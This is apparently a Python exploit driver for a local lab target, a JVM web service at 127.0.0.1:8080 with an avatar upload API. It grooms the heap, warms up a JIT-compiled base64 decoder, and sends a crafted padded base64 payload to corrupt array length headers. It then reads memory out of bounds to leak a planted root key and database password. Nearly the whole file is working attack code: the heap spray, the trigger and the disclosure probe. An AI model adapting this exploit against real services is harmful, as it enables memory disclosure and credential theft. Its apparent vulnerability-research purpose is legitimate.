#!/usr/bin/env python3
"""Phase-scan experiment driver — runs against the PERSISTENT lab victim.
Each invocation is one experiment (~60-90s), state persists between runs.

usage: scan.py [--shape pad2|pad1] [--k-adjust N] [--drop-id f69] [--no-cycle]
"""
import json, re, sys, time, urllib.request, urllib.error, base64 as b64

BASE = "http://127.0.0.1:8080"
GCLOG = "/share/gc.log"
CYCLE = re.compile(r"Concurrent Mark Cycle .*ms")

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method,
                               headers={"X-User": "demo", "Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return -1, str(e).encode(), {}

def diag():
    code, body, _ = req("GET", "/api/diag", timeout=15)
    if code != 200:
        return None
    try:
        return json.loads(body.decode())
    except Exception:
        return {}

def cycles():
    try:
        return len(CYCLE.findall(open(GCLOG, errors="ignore").read()))
    except OSError:
        return -1

def wait_cycle(before, timeout=120):
    deadline = time.time() + timeout
    while time.time() < deadline:
        now = cycles()
        if now > before:
            return now
        time.sleep(1)
    return before

def pad_body(tail, k_adj=0):
    k = (1747620 if tail == "AB" else 1747616) + 16 * k_adj
    return b64.b64encode((("A" * (4 * k)) + tail).encode("latin-1"))

def main():
    args = sys.argv[1:]
    shape = args[args.index("--shape") + 1] if "--shape" in args else "pad2"
    k_adj = int(args[args.index("--k-adjust") + 1]) if "--k-adjust" in args else 0
    drop_id = args[args.index("--drop-id") + 1] if "--drop-id" in args else "f69"

    if not alive_ok():
        print("VICTIM-DOWN"); sys.exit(2)

    d0 = diag()
    have_gap_src = drop_id in (d0 or {})
    # ensure filler inventory exists (first experiment only)
    if d0 is None or sum(1 for k in d0 if k.startswith("f")) < 100:
        print("[init] filling inventory (one-time)...")
        fill = pad_body("AB")
        for i in list(range(0, 69)) + list(range(71, 100)):
            req("POST", "/api/avatar?id=f%d" % i, fill)
        secret = (b"CLASSIFIED-ROOT-KEY=A7f3c9e1d2b8a6405f7c2e91d4b6a830 "
                  b"DB-PASSWORD=hunter2-special-session ")
        req("POST", "/api/avatar?id=cred",
            b64.b64encode(secret + b"X" * (5 * 1024 * 1024 - len(secret))))
        print("[init] inventory done:", req("GET", "/api/status")[1].decode().strip(), flush=True)

    # C2 warmup — decode0 tier4 (only needed once per JVM; cheap to repeat)
    shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A" * 4096 + b"AB",
              b"A" * 4096 + b"ABC", b"A" * 4096 + b"AB=="]
    print("[W] warmup 20K...", flush=True)
    for i in range(20000):
        code, _, h = req("POST", "/api/avatar?id=warm", b64.b64encode(shapes[i & 3]))
        if code == 201:
            req("DELETE", "/api/avatar?id=warm")
    print("[W] done", flush=True)

    if not have_gap_src:
        # re-allocate the drop-source (previous experiment consumed it)
        print("[*] re-filling drop source %s" % drop_id, flush=True)
        req("POST", "/api/avatar?id=" + drop_id, pad_body("AB"))

    tail = "==" if shape == "pad2" else "="
    trig = pad_body(tail, k_adj)
    c0 = cycles()
    code, body, _ = req("POST", "/api/avatar?id=trig_" + shape + ("_%d" % k_adj if k_adj else ""), trig)
    print("[T] %s k_adj=%+d -> HTTP %s body=%s" % (shape, k_adj, code, body[:90].decode("latin-1")), flush=True)
    if not alive_ok():
        print("VERDICT: CRASH (JVM died — write hit unmapped/class path)"); sys.exit(42)

    c1 = wait_cycle(c0, 100)
    print("[C] cycles %d -> %d" % (c0, c1), flush=True)

    d1 = diag()
    if d1 is None:
        print("VERDICT: DIAG-FAIL"); sys.exit(2)
    baseline = {k: v for k, v in d0.items()} if d0 else {}
    anomalies = []
    for k, v in sorted(d1.items()):
        if k.startswith("f") and not k.startswith("f9") and v != 5242861:
            anomalies.append((k, v))
        if k == "cred" and v != 5242880:
            anomalies.append((k, v))
        if k.startswith("trig") and v > 5600000:
            anomalies.append((k, v))
    print("[D] corrupted arrays:", anomalies if anomalies else "none", flush=True)

    # disclosure probe: any huge-positive array? GET it and measure
    disclosed = False
    for k, v in anomalies:
        if 0 < v < 5242880 * 8:   # positive corrupted length → probe read
            code, data, _ = req("GET", "/api/avatar?id=" + k, timeout=120)
            got = len(data)
            expected = 5242880 if k == "cred" else 5242861
            if got > expected + 4096:
                marker = data.find(b"CLASSIFIED-ROOT-KEY")
                print("[D] %s DISCLOSED %d bytes (+%d), key-marker at %s"
                      % (k, got, got - expected, marker), flush=True)
                if marker >= 0:
                    print("[D] SECRET: " + data[marker:marker + 64].decode("latin-1", "replace"), flush=True)
                disclosed = True
            else:
                print("[D] %s read returned %d (no overflow)" % (k, got), flush=True)

    if disclosed:
        print("VERDICT: DISCLOSED"); sys.exit(43)
    if anomalies:
        print("VERDICT: CORRUPTED-NEGATIVE-OR-ODD (lengths visible in diag)"); sys.exit(41)
    print("VERDICT: CLEAN (no header corruption observed this run)"); sys.exit(0)

def alive_ok():
    return req("GET", "/api/status", timeout=5)[0] == 200

if __name__ == "__main__":
    main()
